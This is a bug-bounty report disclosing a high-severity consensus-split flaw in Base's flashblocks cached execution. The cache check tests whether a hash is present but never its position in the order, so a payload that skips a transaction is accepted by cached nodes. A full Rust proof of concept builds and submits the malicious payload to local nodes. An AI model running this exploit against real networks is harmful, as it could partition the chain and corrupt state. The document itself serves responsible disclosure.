# 74944 bc high flashblocks cached execution accepts skipped transactions engine level consensus split

*Submitted on Apr 26th 2026 at 04:14:50 UTC by @nord0x for* [*Audit Comp | Base Azul*](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #74944
* **Report Type:** Blockchain/DLT
* **Report severity:** High
* **Target:** <https://github.com/base/base/tree/v0.8.0-rc.24>
* **Impacts:**
  * Unintended chain split (network partition)

## Description

## Bug Description

`crates/execution/engine-tree/src/cached_execution.rs` line 58–66:

```rust
// cached_execution.rs:58-66 (literal)
if let Some(prev_cached_hash) = prev_cached_hash {
    // all previous transactions from start of block to prev_cached_hash are cached,
    // so only check if the previous transaction is cached
    if !pending_blocks.has_transaction_hash(prev_cached_hash) {
        warn!(
            prev_cached_hash = ?prev_cached_hash,
            "Not using cached results - previous transaction not cached",
        );
        return None;
    }
}
```

`has_transaction_hash` is `HashMap::contains_key` (`pending_blocks.rs:384-386`):

```rust
// pending_blocks.rs:384-386 (literal)
pub fn has_transaction_hash(&self, tx_hash: &B256) -> bool {
    self.transactions_by_hash.contains_key(tx_hash)
}
```

It checks whether the hash exists *anywhere* in the cache — it never checks whether the requested transaction is the *immediate successor* of that hash in the cached pending order.

The comment at line 59 reveals the developer's intent: they assumed payloads always arrive in the same order as the pending cache. But nothing in the code enforces that assumption — `has_transaction_hash` is a membership test, not a position test.

A payload body `[deposit, nonce1]` that omits `nonce0`:

| Step                      | Cached node                                                | Vanilla node                                            |
| ------------------------- | ---------------------------------------------------------- | ------------------------------------------------------- |
| Lookup `deposit` in cache | Found → guard passes                                       | N/A (no cache)                                          |
| Execute `nonce1`          | Returns cached result (computed when `nonce0` was present) | Re-executes from state → `nonce 1 too high, expected 0` |
| Verdict                   | **Valid**                                                  | **Invalid**                                             |

Same parent state, same payload, different verdict. Hard consensus split.

## Root Cause

`CachedExecutor::execute_transaction_without_commit` at line 183 derives `prev_tx_hash` from the incoming payload body's ordering (`self.txs`), not from the pending flashblocks order:

```rust
let prev_tx_hash = tx_position.checked_sub(1).and_then(|pos| self.txs.get(pos));
```

This `prev_tx_hash` is passed to `FlashblocksCachedExecutionProvider::get_cached_execution_for_tx`, which only checks if that hash exists somewhere in the cache (lines 58–66 above). If it does, the provider returns the cached `ResultAndState` unconditionally (lines 80–81):

```rust
trace!(tx_hash = ?tx_hash, "cache hit for transaction");
pending_blocks.get_op_tx_result(tx_hash)
```

The cached result for `nonce1` was computed in a world where `nonce0` had already executed and incremented the sender's nonce from 0 to 1. When the malicious payload skips `nonce0`, the EVM state hasn't seen that increment — but the cached node trusts the stale result and commits it anyway.

Affected code:

1. `crates/execution/engine-tree/src/cached_execution.rs:58-66` — existence-only guard
2. `crates/execution/engine-tree/src/cached_execution.rs:80-81` — unconditional cache return
3. `crates/execution/engine-tree/src/cached_execution.rs:183` — `prev_tx_hash` from payload body, not cache order
4. `crates/execution/flashblocks/src/pending_blocks.rs:384-386` — `contains_key` with no ordering
5. `crates/execution/engine-tree/src/validator.rs:767-784` — wires `CachedExecutor` into the engine pipeline
6. `crates/client/flashblocks-node/src/extension.rs:46-53` — enables flashblocks-aware validator

## Impact

A sequencer or `unsafe_block_signer` crafts an `engine_newPayloadV4` body that omits one or more transactions present in the cached pending block. Every flashblocks-cached node accepts it as `Valid` and advances its chain tip. Every non-cached node rejects it as `Invalid`.

* **Hard consensus split** between cached and non-cached validators. Irreconcilable chain tips.
* **Invalid state commitment.** The cached node accepts a block whose execution results were computed under assumptions that don't hold (the skipped transaction's state effects are missing). The PoC proves the cached node returns `Valid` for this block while the vanilla node returns `Invalid` — the two nodes disagree on whether the block belongs to the canonical chain.

Precondition: the victim node runs with `FlashblocksConfig.cached_execution = true`. This flag defaults to `false` (see `config.rs:24`) and must be explicitly enabled. However, cached execution is the performance optimization that makes flashblocks viable at production throughput — operators running the flashblocks extension are expected to enable it.

## Severity

**High** — Unintended chain split (network partition).

The PoC launches three real Base nodes from the same genesis, mines a shared parent block, then submits the same `engine_newPayloadV4` payload to both the cached-flashblocks node and the independent vanilla node. The cached node returns `Valid`; the vanilla node returns `Invalid`. Same parent state, same payload, opposite verdicts. This is a network partition by definition.

The attacker model is the sequencer or `unsafe_block_signer` — the entity that constructs `engine_newPayloadV4` payloads in Base's architecture. No external network access or privilege escalation is required beyond the ability to author payload bodies, which is the sequencer's core function.

Importantly, the divergence occurs between **honest validators** — the cached node and the vanilla node are both behaving correctly according to their own execution logic. A sequencer bug that drops or reorders transactions (without any malicious intent) would trigger the same split. The vulnerability is in the cache validation logic, not in the sequencer's behavior.

## Link to Proof of Concept

<https://gist.github.com/drawrowfly/48f7ec42fd3c0a4343f85a962d621844>

## Proof of Concept

Launches three real Base v0.8.0-rc.15 nodes — one reference, one cached-flashblocks victim, one independent vanilla. All start from the same genesis. The PoC mines a shared parent block, primes the victim's cache with `[deposit, nonce0, nonce1]`, then submits `[deposit, nonce1]` (skipping `nonce0`) to both victim and independent node.

### Build & run

```bash
git clone --branch v0.8.0-rc.15 --depth 1 \
  https://github.com/base/base.git base-v0.8.0-rc.15
cd base-v0.8.0-rc.15

# Solidity test artifacts (needed by test harness)
cd crates/utilities/test-utils/contracts
forge soldeer install && forge build
cd ../../../..

# Copy PoC crate into workspace
mkdir -p poc-cache-order/src
cp /path/to/gist/src/main.rs poc-cache-order/src/main.rs
cp /path/to/gist/Cargo.toml poc-cache-order/Cargo.toml

# Register in workspace members, then:
cargo run -p cache-order-engine-poc --release
```

Or use the provided `run_poc.sh` which handles all of this automatically(can be found in github gist that is attached to the report)

### Output

```
============================================================
  PoC — Flashblocks Cached Execution Transaction-Order Bypass
  Base v0.8.0-rc.15
============================================================

Input state:
  tx0 (nonce0) hash = 0x440f6df9...316f47a7
  tx1 (nonce1) hash = 0x76cb5baf...914c249

------------------------------------------------------------
Step 1: Shared parent block (all three nodes)
------------------------------------------------------------

  reference    = 0x8fc6f7ff...87c42da  Valid
  victim       = 0x8fc6f7ff...87c42da  Valid
  independent  = 0x8fc6f7ff...87c42da  Valid

  All three nodes share the same parent state. ✓

------------------------------------------------------------
Step 2: Reference builds full honest block [deposit, nonce0, nonce1]
------------------------------------------------------------

  reference_full_block = 0xa92c5e63...6a0ba8f  Valid ✓

------------------------------------------------------------
Step 3: Build malicious payload [deposit, nonce1] (skip nonce0)
------------------------------------------------------------

  malicious_block_hash  = 0xc83d86cf...55aa220
  malicious_state_root  = 0xf8ac9f0b...8ff28ef
  malicious_receipts    = 0x2b304559...f0c5de
  malicious_gas_used    = 46010
  skipped_nonce0        = true

  Cache primed with: [deposit, nonce0, nonce1]
  Payload sent:       [deposit, nonce1]

------------------------------------------------------------
Step 4: Submit malicious payload to victim + independent node
------------------------------------------------------------

  cached victim:
    PayloadStatus { status: Valid,
      latest_valid_hash: 0xc83d86cf...55aa220 }

  independent vanilla:
    PayloadStatus { status: Invalid {
      validation_error: "nonce 1 too high, expected 0" },
      latest_valid_hash: 0x8fc6f7ff...87c42da }

  victim accepted  = true
  independent rejected = true

============================================================
  CONFIRMED ENGINE SPLIT
  Cached flashblocks validator accepted [deposit, nonce1]
  while a vanilla node rejected the same payload.
  Same parent state, same payload, different verdict.
============================================================
```

## PoC code

**Cargo.toml**

```bash
# Cargo.toml — Drop this into poc-cache-order/ inside the base repo root.
# The crate paths below are relative to the base workspace root.
[package]
name = "cache-order-engine-poc"
version = "0.1.0"
edition = "2024"

[dependencies]
alloy-consensus = { version = "1.8", features = ["std"] }
alloy-eips = { version = "1.8", features = ["std"] }
alloy-primitives = { version = "1.5.6", features = ["std"] }
alloy-provider = "1.8"
alloy-rpc-types = "1.8"
alloy-rpc-types-engine = { version = "1.8", features = ["std"] }
base-common-consensus = { path = "../crates/common/consensus", features = ["reth"] }
base-common-flashblocks = { path = "../crates/common/flashblocks" }
base-common-network = { path = "../crates/common/network" }
base-common-rpc-types = { path = "../crates/common/rpc-types" }
base-common-rpc-types-engine = { path = "../crates/common/rpc-types-engine" }
base-execution-chainspec = { path = "../crates/execution/chainspec" }
base-execution-consensus = { path = "../crates/execution/consensus" }
base-flashblocks = { path = "../crates/execution/flashblocks" }
base-flashblocks-node = { path = "../crates/client/flashblocks-node" }
base-node-runner = { path = "../crates/execution/runner", features = ["test-utils"] }
base-test-utils = { path = "../crates/utilities/test-utils" }
eyre = "0.6"
reth-provider = { git = "https://github.com/paradigmxyz/reth", tag = "v1.11.3" }
reth-primitives-traits = { git = "https://github.com/paradigmxyz/reth", tag = "v1.11.3" }
reth-transaction-pool = { git = "https://github.com/paradigmxyz/reth", tag = "v1.11.3", features = ["test-utils"] }
tokio = { version = "1.48.0", features = ["macros", "rt-multi-thread", "time"] }
url = "2.5"
```

**main.rs**

```rust
use std::{sync::Arc, time::Duration};

use alloy_consensus::TxReceipt;
use alloy_eips::{BlockHashOrNumber, eip2718::Encodable2718, eip7685::Requests};
use alloy_primitives::{Address, B256, B64, Bloom, Bytes, logs_bloom};
use alloy_provider::Provider;
use alloy_rpc_types::BlockNumberOrTag;
use alloy_rpc_types_engine::{
    CancunPayloadFields, PayloadAttributes, PayloadStatus, PraguePayloadFields,
};
use base_common_consensus::{BaseReceipt, BaseTransactionSigned};
use base_common_flashblocks::{
    ExecutionPayloadBaseV1, ExecutionPayloadFlashblockDeltaV1, Flashblock, Metadata,
};
use base_common_rpc_types::GenesisInfo;
use base_common_rpc_types_engine::{
    BaseExecutionPayload, BaseExecutionPayloadSidecar, BaseExecutionPayloadV4,
};
use base_execution_chainspec::BaseChainSpec;
use base_execution_consensus::calculate_receipt_root_no_memo_optimism;
use base_flashblocks::{
    FlashblocksAPI, FlashblocksConfig, FlashblocksReceiver, FlashblocksState,
};
use base_flashblocks_node::FlashblocksExtension;
use base_node_runner::{
    BaseNodeExtension,
    test_utils::{
        BLOCK_BUILD_DELAY_MS, BLOCK_TIME_SECONDS, GAS_LIMIT, L1_BLOCK_INFO_DEPOSIT_TX,
        L1_BLOCK_INFO_DEPOSIT_TX_HASH, LocalNode, NODE_STARTUP_DELAY_MS,
        EngineApi, IpcEngine,
    },
};
use base_test_utils::{Account, build_test_genesis_v1};
use reth_primitives_traits::Block as BlockT;
use reth_provider::{BlockReader, ChainSpecProvider, ReceiptProvider};
use reth_transaction_pool::test_utils::TransactionBuilder;
use tokio::time::sleep;

struct LaunchedNode {
    node: LocalNode,
    engine: EngineApi<IpcEngine>,
    flashblocks: Option<Arc<FlashblocksState>>,
}

#[tokio::main]
async fn main() -> eyre::Result<()> {
    println!("============================================================");
    println!("  PoC: Flashblocks Cached Execution Transaction-Order Bypass");
    println!("  Base v0.8.0-rc.15");
    println!("============================================================");
    println!();

    let chain_spec = Arc::new(BaseChainSpec::from_genesis(build_test_genesis_v1()));
    let tx0 = build_transfer_tx(&chain_spec, Account::Alice, Account::Alice, 0, 0);
    let tx1 = build_transfer_tx(&chain_spec, Account::Alice, Account::Charlie, 1, 1);
    let tx0_hash = *tx0.hash();
    let tx1_hash = *tx1.hash();
    let tx0_raw: Bytes = tx0.encoded_2718().into();
    let tx1_raw: Bytes = tx1.encoded_2718().into();

    println!("Input state:");
    println!("  tx0 (nonce0) hash = {tx0_hash:?}");
    println!("  tx1 (nonce1) hash = {tx1_hash:?}");
    println!();

    let reference = launch_node(Arc::clone(&chain_spec), false).await?;
    let (reference_parent, _, _, _) =
        build_and_insert_payload("reference_parent_block", &reference.node, &reference.engine, vec![])
            .await?;
    let reference_parent_hash = reference_parent.payload_inner.payload_inner.payload_inner.block_hash;

    let victim = launch_node(Arc::clone(&chain_spec), true).await?;
    let (victim_parent, _, _, _) =
        build_and_insert_payload("victim_parent_block", &victim.node, &victim.engine, vec![])
            .await?;
    let victim_parent_hash = victim_parent.payload_inner.payload_inner.payload_inner.block_hash;

    let independent = launch_node(Arc::clone(&chain_spec), false).await?;
    let (independent_parent, _, _, _) = build_and_insert_payload(
        "independent_parent_block",
        &independent.node,
        &independent.engine,
        vec![],
    )
    .await?;
    let independent_parent_hash =
        independent_parent.payload_inner.payload_inner.payload_inner.block_hash;

    println!("------------------------------------------------------------");
    println!("Step 1: Shared parent block (all three nodes)");
    println!("------------------------------------------------------------");
    println!();
    println!("  reference    = {reference_parent_hash:?}  Valid");
    println!("  victim       = {victim_parent_hash:?}  Valid");
    println!("  independent  = {independent_parent_hash:?}  Valid");
    println!();
    if reference_parent_hash != victim_parent_hash || reference_parent_hash != independent_parent_hash
    {
        return Err(eyre::eyre!(
            "parent block mismatch; cannot compare the same malicious payload across nodes"
        ));
    }
    println!("  All three nodes share the same parent state.");
    println!();

    let (full_payload, parent_beacon_root, full_requests) =
        build_payload(&reference.node, &reference.engine, vec![tx0_raw.clone(), tx1_raw.clone()])
            .await?;
    let full_parent_hash = full_payload.payload_inner.payload_inner.payload_inner.parent_hash;
    let full_block_hash = full_payload.payload_inner.payload_inner.payload_inner.block_hash;
    println!("------------------------------------------------------------");
    println!("Step 2: Reference builds full honest block [deposit, nonce0, nonce1]");
    println!("------------------------------------------------------------");
    println!();
    println!("  parent       = {full_parent_hash:?}");
    println!("  block_hash   = {full_block_hash:?}");

    let full_status = submit_payload(
        "reference_full_valid",
        &reference.engine,
        full_payload.clone(),
        parent_beacon_root,
        full_requests.clone(),
    )
    .await?;
    println!("  status       = {full_status:?}");
    println!();
    println!("  Full honest block accepted by reference node.");
    println!();
    reference
        .engine
        .update_forkchoice(full_parent_hash, full_block_hash, None)
        .await?;
    sleep(Duration::from_millis(50)).await;

    let receipts = reference
        .node
        .blockchain_provider()
        .receipts_by_block(BlockHashOrNumber::Number(2))?
        .ok_or_else(|| eyre::eyre!("reference block receipts missing"))?;
    if receipts.len() != 3 {
        return Err(eyre::eyre!("expected three reference receipts, got {}", receipts.len()));
    }

    let mut malicious = full_payload.clone();
    malicious.payload_inner.payload_inner.payload_inner.transactions =
        vec![L1_BLOCK_INFO_DEPOSIT_TX, tx1_raw.clone()];
    rewrite_receipts_gas_and_hash(
        &mut malicious,
        &receipts,
        &chain_spec,
        parent_beacon_root,
        full_requests.clone(),
    )?;

    let malicious_hash = malicious.payload_inner.payload_inner.payload_inner.block_hash;
    let malicious_state_root = malicious.payload_inner.payload_inner.payload_inner.state_root;
    let malicious_receipts_root = malicious.payload_inner.payload_inner.payload_inner.receipts_root;
    let malicious_gas = malicious.payload_inner.payload_inner.payload_inner.gas_used;
    println!("------------------------------------------------------------");
    println!("Step 3: Build malicious payload [deposit, nonce1] (skip nonce0)");
    println!("------------------------------------------------------------");
    println!();
    println!("  block_hash    = {malicious_hash:?}");
    println!("  state_root    = {malicious_state_root:?}");
    println!("  receipts_root = {malicious_receipts_root:?}");
    println!("  gas_used      = {malicious_gas}");
    println!("  skipped_nonce0 = true");
    println!();

    println!("  Cache primed with: [deposit, nonce0, nonce1]");
    println!("  Payload sent:       [deposit, nonce1]");
    println!();

    prime_flashblocks(
        &victim.node,
        victim.flashblocks.as_ref().expect("cached node has flashblocks state"),
        tx0_raw,
        tx1_raw.clone(),
        &malicious,
    )
    .await?;

    let victim_status = submit_payload(
        "cached_flashblocks_victim",
        &victim.engine,
        malicious.clone(),
        parent_beacon_root,
        full_requests.clone(),
    )
    .await?;
    let independent_status = submit_payload(
        "independent_normal_node",
        &independent.engine,
        malicious,
        parent_beacon_root,
        full_requests,
    )
    .await?;

    println!("------------------------------------------------------------");
    println!("Step 4: Submit malicious payload to victim + independent node");
    println!("------------------------------------------------------------");
    println!();
    println!("  cached victim:");
    println!("    {victim_status:?}");
    println!();
    println!("  independent vanilla:");
    println!("    {independent_status:?}");
    println!();

    let victim_valid = !victim_status.status.is_invalid();
    let independent_invalid = independent_status.status.is_invalid();
    println!("  victim accepted    = {victim_valid}");
    println!("  independent rejected = {independent_invalid}");
    println!();

    if victim_valid && independent_invalid {
        println!("============================================================");
        println!("  CONFIRMED ENGINE SPLIT");
        println!("  Cached flashblocks validator accepted [deposit, nonce1]");
        println!("  while a vanilla node rejected the same payload.");
        println!("  Engine split confirmed against the malicious payload.");
        println!("============================================================");
        Ok(())
    } else {
        Err(eyre::eyre!(
            "engine-level split not confirmed: victim_valid={victim_valid} independent_invalid={independent_invalid}"
        ))
    }
}

async fn build_and_insert_payload(
    label: &str,
    node: &LocalNode,
    engine: &EngineApi<IpcEngine>,
    transactions: Vec<Bytes>,
) -> eyre::Result<(BaseExecutionPayloadV4, B256, Requests, PayloadStatus)> {
    let (payload, parent_beacon_root, requests) = build_payload(node, engine, transactions).await?;
    let parent_hash = payload.payload_inner.payload_inner.payload_inner.parent_hash;
    let block_hash = payload.payload_inner.payload_inner.payload_inner.block_hash;
    let status = submit_payload(label, engine, payload.clone(), parent_beacon_root, requests.clone())
        .await?;
    if status.status.is_invalid() {
        return Err(eyre::eyre!("{label} unexpectedly invalid: {status:?}"));
    }
    engine.update_forkchoice(parent_hash, block_hash, None).await?;
    sleep(Duration::from_millis(50)).await;
    Ok((payload, parent_beacon_root, requests, status))
}

fn build_transfer_tx(
    chain_spec: &BaseChainSpec,
    from: Account,
    to: Account,
    amount: u128,
    nonce: u64,
) -> BaseTransactionSigned {
    let txn = TransactionBuilder::default()
        .signer(B256::from_slice(
            &hex::decode_private_key(from.private_key()).expect("valid test private key"),
        ))
        .chain_id(chain_spec.chain().id())
        .to(to.address())
        .nonce(nonce)
        .value(amount)
        .gas_limit(21_000)
        .max_fee_per_gas(1_000_000_000)
        .max_priority_fee_per_gas(1_000_000_000)
        .into_eip1559()
        .as_eip1559()
        .expect("eip1559 tx")
        .clone();

    BaseTransactionSigned::Eip1559(txn)
}

async fn launch_node(
    chain_spec: Arc<BaseChainSpec>,
    cached_flashblocks: bool,
) -> eyre::Result<LaunchedNode> {
    let mut flashblocks = None;
    let extensions: Vec<Box<dyn BaseNodeExtension>> = if cached_flashblocks {
        let mut cfg = FlashblocksConfig::new("ws://127.0.0.1:1".parse()?, 5);
        cfg.cached_execution = true;
        flashblocks = Some(Arc::clone(&cfg.state));
        vec![Box::new(FlashblocksExtension::new(Some(cfg)))]
    } else {
        Vec::new()
    };

    let node = LocalNode::new(extensions, chain_spec).await?;
    let engine = node.engine_api()?;
    sleep(Duration::from_millis(NODE_STARTUP_DELAY_MS)).await;
    Ok(LaunchedNode { node, engine, flashblocks })
}

async fn build_payload(
    node: &LocalNode,
    engine: &EngineApi<IpcEngine>,
    mut transactions: Vec<Bytes>,
) -> eyre::Result<(BaseExecutionPayloadV4, B256, Requests)> {
    if transactions.first().is_none_or(|tx| tx != &L1_BLOCK_INFO_DEPOSIT_TX) {
        transactions.insert(0, L1_BLOCK_INFO_DEPOSIT_TX);
    }

    let latest_block = node
        .provider()?
        .get_block_by_number(BlockNumberOrTag::Latest)
        .await?
        .ok_or_else(|| eyre::eyre!("latest block missing"))?;

    let parent_hash = latest_block.header.hash;
    let parent_beacon_block_root =
        latest_block.header.parent_beacon_block_root.unwrap_or(B256::ZERO);
    let next_timestamp = latest_block.header.timestamp + BLOCK_TIME_SECONDS;
    let min_base_fee = latest_block.header.base_fee_per_gas.unwrap_or_default();
    let chain_spec = node.blockchain_provider().chain_spec();
    let base_fee_params = chain_spec.base_fee_params_at_timestamp(next_timestamp);
    let eip_1559_params = ((base_fee_params.max_change_denominator as u64) << 32)
        | (base_fee_params.elasticity_multiplier as u64);

    let payload_attributes = base_common_rpc_types_engine::BasePayloadAttributes {
        payload_attributes: PayloadAttributes {
            timestamp: next_timestamp,
            parent_beacon_block_root: Some(parent_beacon_block_root),
            withdrawals: Some(vec![]),
            ..Default::default()
        },
        transactions: Some(transactions),
        gas_limit: Some(GAS_LIMIT),
        no_tx_pool: Some(true),
        min_base_fee: Some(min_base_fee),
        eip_1559_params: Some(B64::from(eip_1559_params)),
    };

    let forkchoice_result =
        engine.update_forkchoice(parent_hash, parent_hash, Some(payload_attributes)).await?;
    let payload_id = forkchoice_result
        .payload_id
        .ok_or_else(|| eyre::eyre!("forkchoice did not return payload id"))?;
    sleep(Duration::from_millis(BLOCK_BUILD_DELAY_MS)).await;

    let azul_active = GenesisInfo::extract_from(&chain_spec.genesis.config.extra_fields)
        .and_then(|genesis_info| genesis_info.base.v1)
        .is_some_and(|activation_time| next_timestamp >= activation_time);

    let (payload, execution_requests): (_, Vec<Bytes>) = if azul_active {
        let envelope = engine.get_payload_v5(payload_id).await?;
        (envelope.execution_payload, envelope.execution_requests)
    } else {
        let envelope = engine.get_payload_v4(payload_id).await?;
        (envelope.execution_payload, envelope.execution_requests)
    };

    let requests =
        if execution_requests.is_empty() { Requests::default() } else { Requests::new(execution_requests) };
    Ok((payload, parent_beacon_block_root, requests))
}

fn rewrite_receipts_gas_and_hash(
    payload: &mut BaseExecutionPayloadV4,
    full_receipts: &[BaseReceipt],
    chain_spec: &BaseChainSpec,
    parent_beacon_block_root: B256,
    requests: Requests,
) -> eyre::Result<()> {
    let deposit_receipt = full_receipts[0].clone();
    let nonce0_receipt = &full_receipts[1];
    let mut nonce1_receipt = full_receipts[2].clone();

    let deposit_gas = deposit_receipt.as_receipt().cumulative_gas_used;
    let nonce0_cumulative = nonce0_receipt.as_receipt().cumulative_gas_used;
    let nonce1_cumulative = nonce1_receipt.as_receipt().cumulative_gas_used;
    // collapse nonce0+nonce1 cumulative into just nonce1's gas since we're skipping nonce0
    let nonce1_delta = nonce1_cumulative
        .checked_sub(nonce0_cumulative)
        .ok_or_else(|| eyre::eyre!("invalid reference gas accounting"))?;
    nonce1_receipt.as_receipt_mut().cumulative_gas_used = deposit_gas + nonce1_delta;

    let malicious_receipts = vec![deposit_receipt, nonce1_receipt];
    let timestamp = payload.payload_inner.payload_inner.payload_inner.timestamp;
    let receipts_root =
        calculate_receipt_root_no_memo_optimism(&malicious_receipts, chain_spec, timestamp);
    let bloom: Bloom = logs_bloom(malicious_receipts.iter().flat_map(|r| r.logs()));

    payload.payload_inner.payload_inner.payload_inner.receipts_root = receipts_root;
    payload.payload_inner.payload_inner.payload_inner.logs_bloom = bloom;
    payload.payload_inner.payload_inner.payload_inner.gas_used = deposit_gas + nonce1_delta;

    let sidecar = BaseExecutionPayloadSidecar::v4(
        CancunPayloadFields::new(parent_beacon_block_root, vec![]),
        PraguePayloadFields::new(requests),
    );
    let block = BaseExecutionPayload::v4(payload.clone()).into_block_with_sidecar_raw(&sidecar)?;
    payload.payload_inner.payload_inner.payload_inner.block_hash = block.header.hash_slow();
    Ok(())
}

async fn prime_flashblocks(
    node: &LocalNode,
    state: &Arc<FlashblocksState>,
    tx0_raw: Bytes,
    tx1_raw: Bytes,
    payload: &BaseExecutionPayloadV4,
) -> eyre::Result<()> {
    let provider = node.blockchain_provider();
    let inner = &payload.payload_inner.payload_inner.payload_inner;
    let parent_block_number = inner
        .block_number
        .checked_sub(1)
        .ok_or_else(|| eyre::eyre!("payload block number underflow"))?;
    let parent_block = provider
        .block(BlockHashOrNumber::Number(parent_block_number))?
        .ok_or_else(|| eyre::eyre!("parent block {parent_block_number} missing"))?
        .try_into_recovered()?;
    state.on_canonical_block_received(parent_block);
    sleep(Duration::from_millis(25)).await;

    let base = Flashblock {
        payload_id: Default::default(),
        index: 0,
        base: Some(ExecutionPayloadBaseV1 {
            parent_beacon_block_root: inner.parent_hash,
            parent_hash: inner.parent_hash,
            fee_recipient: Address::ZERO,
            prev_randao: inner.prev_randao,
            block_number: inner.block_number,
            gas_limit: inner.gas_limit,
            timestamp: inner.timestamp,
            extra_data: Bytes::new(),
            base_fee_per_gas: inner.base_fee_per_gas,
        }),
        diff: ExecutionPayloadFlashblockDeltaV1 {
            state_root: B256::ZERO,
            receipts_root: B256::ZERO,
            block_hash: B256::ZERO,
            gas_used: 0,
            withdrawals: Vec::new(),
            logs_bloom: Bloom::ZERO,
            withdrawals_root: Default::default(),
            transactions: vec![L1_BLOCK_INFO_DEPOSIT_TX],
            blob_gas_used: Default::default(),
        },
        metadata: Metadata { block_number: inner.block_number },
    };

    let delta = Flashblock {
        payload_id: Default::default(),
        index: 1,
        base: None,
        diff: ExecutionPayloadFlashblockDeltaV1 {
            state_root: B256::ZERO,
            receipts_root: B256::ZERO,
            block_hash: B256::ZERO,
            gas_used: 0,
            withdrawals: Vec::new(),
            logs_bloom: Bloom::ZERO,
            withdrawals_root: Default::default(),
            transactions: vec![tx0_raw, tx1_raw],
            blob_gas_used: Default::default(),
        },
        metadata: Metadata { block_number: inner.block_number },
    };

    state.on_flashblock_received(base);
    sleep(Duration::from_millis(25)).await;
    state.on_flashblock_received(delta);
    sleep(Duration::from_millis(100)).await;

    let pending = state
        .get_pending_blocks()
        .clone()
        .ok_or_else(|| eyre::eyre!("flashblocks pending state missing after priming"))?;
    let pending_hashes: Vec<B256> = pending
        .get_transactions_for_block(inner.block_number)
        .map(|tx| tx.inner.inner.tx_hash())
        .collect();
    // priming done, check we got exactly 3 pending txs
    if pending_hashes.len() != 3 {
        return Err(eyre::eyre!("unexpected pending tx count: {}", pending_hashes.len()));
    }
    Ok(())
}

async fn submit_payload(
    _label: &str,
    engine: &EngineApi<IpcEngine>,
    payload: BaseExecutionPayloadV4,
    parent_beacon_block_root: B256,
    requests: Requests,
) -> eyre::Result<PayloadStatus> {
    let status = engine.new_payload(payload, vec![], parent_beacon_block_root, requests).await?;
    Ok(status)
}

mod hex {
    pub fn decode_private_key(value: &str) -> Result<Vec<u8>, eyre::Report> {
        let trimmed = value.strip_prefix("0x").unwrap_or(value);
        alloy_primitives::hex::decode(trimmed).map_err(Into::into)
    }
}
```
